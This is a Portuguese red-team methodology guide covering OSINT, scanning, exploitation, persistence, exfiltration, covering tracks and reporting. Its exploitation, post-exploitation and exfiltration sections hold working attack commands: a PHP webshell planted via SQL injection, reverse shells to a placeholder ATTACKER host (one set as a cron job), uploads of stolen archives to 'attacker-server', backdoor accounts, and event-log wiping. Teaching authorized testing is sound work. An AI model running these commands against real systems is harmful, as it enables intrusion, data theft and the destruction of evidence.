# 🔴 Red Team - Metodologia Completa de Testes de Segurança

## Do Reconhecimento ao Relatório Profissional

---

## 📖 Índice

1. [O que é Red Team?](#oque-red-team)
2. [Fases do Red Team](#fases)
3. [Fase 1: Reconhecimento (OSINT)](#fase-1)
4. [Fase 2: Scanning e Enumeração](#fase-2)
5. [Fase 3: Exploração](#fase-3)
6. [Fase 4: Pós-Exploração](#fase-4)
7. [Fase 5: Exfiltração e Cobertura](#fase-5)
8. [Fase 6: Relatório](#fase-6)

---

## O que é Red Team? {#oque-red-team}

### 📌 Explicação Simples

Red Team simula um **ataque real contra um alvo** para validar defesas.

```
Red Team = Hackers autorizados testando segurança
      ↓
Objetivo: Encontrar fraquezas ANTES de hacker de verdade

Diferenças:
┌─────────────────┬──────────────────┬──────────────────┐
│ Teste Pentest   │ Red Team         │ Bug Bounty       │
├─────────────────┼──────────────────┼──────────────────┤
│ Escopo: Setores │ Escopo: Amplo    │ Escopo: Aberto   │
│ Duração: 1-4sem │ Duração: 1-6 mes │ Duração: Contínua│
│ Foco: Aplic web │ Foco: Tudo       │ Foco: Bugs      │
│ Relatório: Sim  │ Relatório: Sim   │ Bounty: Sim      │
└─────────────────┴──────────────────┴──────────────────┘
```

### 🔧 Explicação Técnica

**Red Team segue Cyber Kill Chain:**

```
RECONNAISSANCE
      ↓
WEAPONIZATION (criar exploit)
      ↓
DELIVERY (entregar)
      ↓
EXPLOITATION (explorar)
      ↓
INSTALLATION (persistência)
      ↓
COMMAND & CONTROL
      ↓
ACTIONS ON OBJECTIVES (objetivo final)
```

---

## Fases do Red Team {#fases}

```
FASE 1: RECONNAISSANCE (Recon)
└─ Coletar informações públicas sobre alvo

FASE 2: SCANNING & ENUMERATION
├─ Descobrir hosts/portas/serviços
├─ Identificar versões
└─ Mapear infraestrutura

FASE 3: EXPLOITATION
├─ Encontrar vulnerabilidades
├─ Explorar com PoC
└─ Ganhar acesso inicial (foothold)

FASE 4: PÓS-EXPLORAÇÃO
├─ Escalação de privilégio
├─ Movimentação lateral
└─ Manutenção de acesso

FASE 5: EXFILTRAÇÃO & COBERTURA
├─ Roubar dados (se objetivo)
├─ Apagar logs
└─ Remover evidências

FASE 6: RELATÓRIO
├─ Documentar findings
├─ Criar narrativa de ataque
└─ Recomendações
```

---

## Fase 1: Reconhecimento (OSINT) {#fase-1}

### 📌 Explicação Simples

Reconhecimento = **coletar informações públicas** sobre seu alvo.

Tudo que você descobre sem enviar um único pacote é OSINT (Open Source INTelligence).

### 🔧 Explicação Técnica

#### **Tipos de OSINT**

1. **Footprinting de Domínio**
```bash
# DNS Lookup
nslookup example.com
dig example.com
dig example.com +trace  # Rastrear até raiz

# Informações de Registrante
whois example.com
whois 142.251.32.14

# Histórico de DNS
nslookup -query=MX example.com  # Mail servers
nslookup -query=NS example.com  # Name servers
nslookup -query=TXT example.com # SPF, DKIM, DMARC
```

2. **Busca de Subdomínios**
```bash
# Google Dorking
site:example.com

# Ferramentas
sublist3r -d example.com
ffuf -w wordlist.txt -u https://FUZZ.example.com
amass enum -d example.com

# DNS Brute Force
dnsrecon -d example.com -D /usr/share/dnsrecon/namelist.txt
```

3. **Busca de Dados Sensíveis**
```bash
# GitHub (código exposto)
site:github.com example.com
site:github.com "example.com" password
site:github.com "example.com" API_KEY

# Shodan (dispositivos conectados)
Shodan.io: example.com
Shodan.io: "example.com" port:3306

# Google dorking avançado
site:example.com filetype:pdf
site:example.com filetype:xlsx
site:example.com "admin" OR "internal"
```

4. **Busca de Informações de Pessoas**
```bash
# LinkedIn (funcionários)
site:linkedin.com "example.com"

# Email leaks (HaveIBeenPwned)
haveibeenpwned.com

# Social media
Twitter, Facebook, Instagram (buscar info de emp.)
```

5. **Infraestrutura & Tecnologia**
```bash
# Whatweb (detecta tecnologias)
whatweb example.com

# Wappalyzer (browser extension)
# Detecta: WordPress, Angular, PHP, etc

# SSL Certificate Info
sslscan example.com
nmap --script ssl-enum-ciphers -p 443 example.com

# Website history
wayback machine (archive.org)
```

### 💡 Exemplo Prático - Reconhecimento Completo

```bash
#!/bin/bash
# Reconhecimento automatizado

TARGET="example.com"

echo "[*] Iniciando OSINT para $TARGET"

# 1. Básico
echo "[+] Whois"
whois $TARGET | head -20

# 2. DNS
echo "[+] DNS Records"
nslookup $TARGET

# 3. Subdomínios (com wordlist pequena)
echo "[+] Subdomínios"
curl -s "https://dns.bufferover.run/api/v1/query?domain=$TARGET" | jq .

# 4. Tecnologia
echo "[+] Tecnologia"
whatweb https://$TARGET

# 5. Certificado SSL
echo "[+] SSL"
openssl s_client -connect $TARGET:443 < /dev/null 2>/dev/null | \
  openssl x509 -text | grep -E "Subject:|CN=|DNS:"

# 6. Busca em Google dorking
echo "[+] Google Dorking (manual)"
echo "Buscar: site:$TARGET password"
echo "Buscar: site:$TARGET API"
echo "Buscar: site:github.com $TARGET"

# 7. Shodan
echo "[+] Shodan (manual em shodan.io)"
echo "Buscar: $TARGET"
echo "Buscar: hostname:$TARGET"
```

### 🛠️ Ferramentas OSINT Essenciais

| Ferramenta | Tipo | Uso |
|-----------|------|-----|
| **Nslookup/Dig** | DNS | Resolver domínios e registros |
| **Whois** | Registrant | Info de dono de domínio |
| **Google** | Dorking | Buscar dados públicos (site:) |
| **Shodan** | IoT/Web | Encontrar dispositivos/serviços |
| **Sublist3r** | Subdomínios | Enumerar subdomínios |
| **Amass** | Recon | Intel corporativo |
| **Theharvestor** | Email | Encontrar emails de empresa |
| **Wappalyzer** | Tech | Detectar tecnologias |
| **Waybback** | History | Ver versões antigas do site |
| **HaveIBeenPwned** | Breaches | Verificar leaks de dados |

### 📚 Checklist OSINT

```
[ ] Whois - Dono de domínio, contatos
[ ] DNS Records - MX, NS, TXT, A, CNAME
[ ] Subdomínios - Enumerar todos
[ ] IP Ranges - Bloco de IPs da empresa
[ ] Google Dorking - filetype, site operators
[ ] GitHub - Código exposto, credenciais
[ ] Shodan - Serviços expostos
[ ] LinkedIn - Funcionários, tecnologias
[ ] Certificado SSL - SANs, validade
[ ] Wayback Machine - Versões antigas
[ ] Breach databases - Emails/senhas vazados
```

---

## Fase 2: Scanning e Enumeração {#fase-2}

### 📌 Explicação Simples

Scanning = **descobrir o que está aberto** (portas, serviços).
Enumeração = **detalhar o que encontrou** (versão, config).

```
Nmap descobre: 192.168.1.1:22 está aberto
Enumeração descobre: SSH versão 7.4 OpenSSH (vulnerável!)
```

### 🔧 Ferramentas Essenciais

#### **1. Nmap - Port Scanning**

```bash
# Scan básico (TCP SYN - mais rápido)
nmap TARGET

# Scan completo (todos os 65535 portas)
nmap -p- TARGET

# Scan com identificação de versão
nmap -sV TARGET

# Scan com scripts (NSE - Nmap Scripting Engine)
nmap -sC TARGET          # Scripts padrão
nmap --script vuln TARGET # Vulnerabilidades

# Scan agressivo (OS detection + version + script + traceroute)
nmap -A TARGET

# UDP scan
nmap -sU -p 53,123,161 TARGET

# Varredura furtiva (SYN stealth, mais lenta)
nmap -sS TARGET

# Salvar resultado
nmap -oX resultado.xml TARGET
nmap -oG resultado.gnmap TARGET
nmap -oA resultado TARGET  # Todos os formatos
```

#### **2. Identification de Serviços**

```bash
# Banner Grabbing (conectar e ver versão)
nc -v TARGET 80
nc -v TARGET 22

# Web application fingerprinting
curl -I https://TARGET

# WebDAV methods
curl -X OPTIONS -v https://TARGET

# LDAP enumeration
ldapsearch -h TARGET -x -s base
```

#### **3. Vulnerability Scanning**

```bash
# Nessus (proprietário, poderoso)
# https://www.tenable.com/products/nessus

# OpenVAS (open source)
openvas-start
# http://localhost:9392

# Nuclei (templates de exploits)
nuclei -u https://TARGET -t nuclei-templates/

# Qualys QWAS (online, conta grátis)
# https://www.qualys.com/

# Rapid7 Insight AppSec
# https://www.rapid7.com/
```

### 💡 Exemplo Prático - Enumeration Completa

```bash
#!/bin/bash
# Enumeration script

TARGET=$1

echo "[*] Scanning $TARGET"

# 1. Portas abertas
echo "[+] Port Scan"
nmap -p- --min-rate 5000 -oX nmap_ports.xml $TARGET

# 2. Versões de serviços
echo "[+] Version Detection"
nmap -sV --script vuln -oX nmap_version.xml $TARGET

# 3. Vulnerabilidades conhecidas
echo "[+] Vulnerability Scan"
nuclei -u https://$TARGET -o nuclei_results.txt

# 4. Web application
echo "[+] Web App Scan"
curl -I https://$TARGET
whatweb https://$TARGET

# 5. SSL/TLS
echo "[+] SSL/TLS Info"
sslscan --no-heartbleed $TARGET:443
testssl.sh $TARGET

# 6. Gerar relatório
echo "[+] Relatórios"
ls nmap_*.xml nuclei_results.txt
```

### 📚 Checklist Scanning

```
[ ] Nmap full port scan (-p-)
[ ] Version detection (-sV)
[ ] Vulnerability scripts (--script vuln)
[ ] UDP common ports (-sU)
[ ] SSL/TLS analysis (sslscan, testssl)
[ ] Web application fingerprinting
[ ] WAF/IPS detection
[ ] Documentar cada serviço encontrado
```

---

## Fase 3: Exploração {#fase-3}

### 📌 Explicação Simples

Exploração = **usar a falha** para ganhar acesso.

```
Vulnerabilidade: Software X versão Y tem RCE
Exploit: Script que usa falha para executar comando
Resultado: Shell remoto no servidor
```

### 🔧 Explicação Técnica

#### **Metodologia de Exploração**

```
1. Identificar serviço/versão
   └─ nmap -sV

2. Buscar exploits conhecidos
   └─ Exploit-DB, CVE, GitHub

3. Testar em lab antes
   └─ Evitar quebrar alvo

4. Adaptar exploit se necessário
   └─ Payloads, encoding

5. Executar com cuidado
   └─ Documentar tudo
```

#### **Ferramentas de Exploração**

**1. Metasploit Framework (mais poderosa)**
```bash
# Abrir Metasploit
msfconsole

# Buscar exploit
search MS17-010
search eternalblue

# Usar módulo
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
run

# Executar commands na shell
meterpreter > getuid
meterpreter > sysinfo
meterpreter > shell
```

**2. Burp Suite (Web application)**
```
1. Intercept requisição
2. Modificar payload
3. Enviar
4. Analisar resposta

Exemplo:
POST /login HTTP/1.1
Body: username=admin' OR '1'='1&password=x
```

**3. Custom Exploits (GitHub/scripts)**
```bash
# Python
python3 exploit.py --target 192.168.1.100 --command "whoami"

# Bash
./exploit.sh TARGET

# Powershell (Windows)
powershell -ExecutionPolicy Bypass -File Exploit.ps1
```

### 💡 Exploração Web - Exemplo Prático

**Exemplo: SQL Injection para RCE**

```
1. Identificar SQL Injection
   Teste: /search?q=test' → Erro SQL

2. Explorar com SQLi
   SELECT version() → Versão do BD
   SELECT @@version_comment → Tipo (MySQL/PostgreSQL)

3. Checar se INTO OUTFILE funciona
   SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php"

4. Acessar shell
   curl http://TARGET/shell.php?cmd=whoami

5. Reverse shell
   cmd: bash -i >& /dev/tcp/ATTACKER/4444 0>&1
```

**SQLMap Automatizado:**
```bash
sqlmap -u "http://TARGET/search.php?q=" -p q --batch --dbs
sqlmap -u "http://TARGET/search.php?q=" -p q --os-shell
```

### 📚 Checklist Exploração

```
[ ] Identificar versões vulneráveis
[ ] Procurar CVE e PoC
[ ] Testar exploits em lab antes
[ ] Documentar cada exploit usado
[ ] Verificar firewall/WAF bypass necessário
[ ] Validar acesso (id, whoami, systeminfo)
```

---

## Fase 4: Pós-Exploração {#fase-4}

### 📌 Explicação Simples

Pós-exploração = **após ganhar acesso inicial**, escalar privilégios e mover lateralmente.

```
Acesso Inicial: User de baixo privilégio
           ↓
Escalação: Ganhar acesso root/admin
           ↓
Lateral: Mover para outros computadores
           ↓
Objetivo Final: Alcançar dados críticos
```

### 🔧 Explicação Técnica

#### **1. Escalação de Privilégio (Privilege Escalation)**

**Linux:**
```bash
# Coletar informação
whoami
id
sudo -l  # Posso rodar algo com sudo?
uname -a
cat /etc/passwd
cat /etc/sudoers

# Buscar exploits
kernel = uname -r → Procurar CVE do kernel
sudo version = sudo --version → CVE?

# Técnicas comuns
1. SUID bit
   find / -perm -4000 2>/dev/null
   Executar binário com privilégio de owner

2. Sudo sem senha
   sudo -l mostra comando sem senha
   Ex: sudo /usr/bin/apt → Pode ser explorado

3. World-writable files
   find / -perm -0777 -type f 2>/dev/null
   Modificar arquivo crítico

4. Cron jobs
   cat /etc/crontab
   Se cron roda script world-writable

5. Kernel exploit
   Explorar CVE do kernel
```

**Windows:**
```powershell
# Coleta de info
whoami
whoami /groups  # Grupos (pode indicar privilégio)
systeminfo
wmic qfe list   # Patches instalados
net user

# Técnicas comuns
1. Token impersonation
   Usar token de usuário privilegiado
   (Rotten Potato, Potato exploit)

2. UAC bypass
   Elevar para admin sem prompt

3. Credential dumping
   Dump de hashes NTLM
   mimikatz.exe

4. Registry modification
   Modificar registros para ganhar acesso

5. DLL hijacking
   Injetar DLL malicioso em programa privilegiado
```

#### **2. Movimentação Lateral (Lateral Movement)**

```bash
# Descobrir outros computadores na rede
ping RANGE

# Verificar conectividade SMB (Windows)
nmap --script smb-enum-shares -p 445 192.168.1.0/24

# Pass-the-Hash (PtH)
# Se conseguir hash NTLM, pode usá-lo para autenticar

# Pass-the-Ticket (PtT)
# Se conseguir Kerberos ticket, pode reusar

# Tunneling / Port Forwarding
ssh -L 3306:192.168.1.200:3306 user@compromised.com
# Agora localhost:3306 conecta ao BD interno

# Pivot (usar máquina comprometida como ponte)
socks4 192.168.1.200:9050
proxychains nmap -p 445 192.168.1.50
```

#### **3. Manutenção de Acesso (Persistence)**

**Linux:**
```bash
# 1. Adicionar usuário backdoor
sudo useradd -m backdoor
sudo passwd backdoor

# 2. SSH key
mkdir ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# 3. Cron job
echo "* * * * * /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1" | crontab -

# 4. Rootkit/Webshell
wget http://attacker/webshell.php -O /var/www/html/shell.php
```

**Windows:**
```powershell
# 1. Usuário backdoor
net user backdoor Password123! /add
net localgroup administrators backdoor /add

# 2. RDP habilitado
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# 3. Scheduled task
schtasks /create /tn Backdoor /tr "powershell -c ..." /sc MINUTE /mo 1

# 4. Registry run
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\path\backdoor.exe"
```

### 📚 Checklist Pós-Exploração

```
[ ] Coletar informações do sistema (uname, systeminfo)
[ ] Buscar escalação de privilégio (sudo, SUID, kernel)
[ ] Escalar privilégios com êxito
[ ] Descobrir outros hosts na rede
[ ] Enumerar compartilhamentos e serviços internos
[ ] Mover lateralmente para outros computadores
[ ] Implantar persistência (backdoor, cron, scheduled task)
[ ] Limpar logs da atividade
```

---

## Fase 5: Exfiltração e Cobertura {#fase-5}

### 📌 Explicação Simples

Exfiltração = **roubar dados**.
Cobertura = **apagar evidências**.

### 🔧 Técnicas

**Exfiltração de Dados:**
```bash
# Comprimir dados
tar czf dados.tar.gz /etc/passwd /home/

# Criptografar
gpg --encrypt --recipient attacker@email dados.tar.gz

# Enviar
curl -F "file=@dados.tar.gz.gpg" https://attacker-server/upload
wget --post-file=dados.tar.gz https://attacker-server/upload
```

**Cobertura/Limpeza:**
```bash
# Linux
history -c
rm ~/.bash_history
echo "" > /var/log/auth.log
echo "" > /var/log/syslog

# Windows
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Remover artefatos
find / -name "shell.php" 2>/dev/null -delete
```

---

## Fase 6: Relatório {#fase-6}

### 📌 Explicação Simples

Relatório = **documentar tudo** que encontrou e como explorou.

### 📋 Estrutura de Relatório Red Team

```
1. RESUMO EXECUTIVO
   ├─ Objetivo do teste
   ├─ Período
   ├─ Resultados de alto nível
   └─ Recomendações críticas

2. SCOPE
   ├─ Alvo (domínio, IPs)
   ├─ Autorizações
   ├─ Limitações

3. METODOLOGIA
   ├─ Fases executadas
   ├─ Ferramentas usadas
   └─ Referências (PTES, NIST)

4. FINDINGS
   ├─ Críticos
   ├─ Altos
   ├─ Médios
   └─ Baixos

   Para cada finding:
   ├─ Descrição
   ├─ Severidade
   ├─ CVSS Score
   ├─ Screenshot/Proof-of-Concept
   ├─ Impacto
   └─ Recomendação

5. NARRATIVA DE ATAQUE
   ├─ Kill chain completa
   ├─ Como ganhou acesso inicial
   ├─ Escalação
   ├─ Lateral movement
   └─ Dados acessados

6. EVIDÊNCIAS
   ├─ Screenshots
   ├─ Logs
   ├─ Outputs de comandos

7. RECOMENDAÇÕES
   ├─ Imediatas (críticas)
   ├─ Curto prazo (30 dias)
   ├─ Médio prazo (90 dias)
   └─ Longo prazo (6-12 meses)

8. APÊNDICE
   ├─ Glossário
   ├─ Referências
   └─ Disclaimer legal
```

### 💡 Exemplo: Finding Bem Documentado

```markdown
## Finding #1: SQL Injection em /api/search

**Severidade**: CRÍTICA
**CVSS v3.1**: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
**CWE**: CWE-89 (Improper Neutralization of Special Elements)

### Descrição
A aplicação é vulnerável a SQL Injection no parâmetro `q` do endpoint `/api/search`.
Entrada do usuário não é validada antes de usar em query SQL.

### Prova de Conceito
```
GET /api/search?q=test' OR '1'='1
HTTP/1.1 200 OK

Retorna: Todos os 1000+ registros de usuários
```

### Impacto
- Exposição de dados sensíveis (PII, credentials)
- Potencial RCE (Remote Code Execution) via INTO OUTFILE
- Violação de confidencialidade e integridade

### Remediação
Usar Prepared Statements:
```python
query = "SELECT * FROM users WHERE name LIKE ?"
db.execute(query, [f"%{search_term}%"])
```

### Referências
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
```

### 📚 Dicas de Relatório

```
DO:
✓ Seja específico e técnico
✓ Forneça PoC reproduzível
✓ Inclua screenshots/logs
✓ CVSS score automatizado
✓ Recomendações acionáveis
✓ Linguagem clara

DON'T:
✗ Genérico ("site is vulnerable")
✗ Sem evidência (screenshot importante!)
✗ Culpar (não atacar pessoalmente)
✗ Exaggerar (ser honesto)
✗ Sem recomendações
✗ Jargão sem explicação
```

---

## 🛠️ Toolkit Red Team Essencial

| Categoria | Ferramenta | Uso |
|-----------|-----------|-----|
| **Reconnaissance** | theHarvester, Amass, Shodan | OSINT |
| **Scanning** | Nmap, Masscan, Zmap | Port scanning |
| **Enumeration** | Nmap NSE, Enum4linux, SMBMap | Service enumeration |
| **Vulnerability** | Nessus, OpenVAS, Nuclei | Vulnerability scanning |
| **Exploitation** | Metasploit, Burp Suite | Exploits |
| **Web** | OWASP ZAP, Burp Intruder | Web app testing |
| **Cracking** | Hashcat, John, Hydra | Password cracking |
| **Privilege Escalation** | linPEAS, winPEAS, Rotten Potato | PrivEsc |
| **Post-Exploitation** | Mimikatz, Empire, PoshC2 | Persistence |
| **Networking** | Proxychains, SSH Tunnel | Pivoting |
| **Forensics** | Volatility, Autopsy | Investigation |

---

## 📚 Referências e Frameworks

- [PTES (Penetration Testing Execution Standard)](http://www.pentest-standard.org/)
- [NIST SP 800-115 (Technical Testing)](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf)
- [MITRE ATT&CK](https://attack.mitre.org/)
- [OWASP Penetration Testing](https://owasp.org/www-project-web-security-testing-guide/)

---

<div align="center">

**⭐ Red Team é arte + ciência + criatividade**

**Documentação clara é tão importante quanto o teste**

</div>
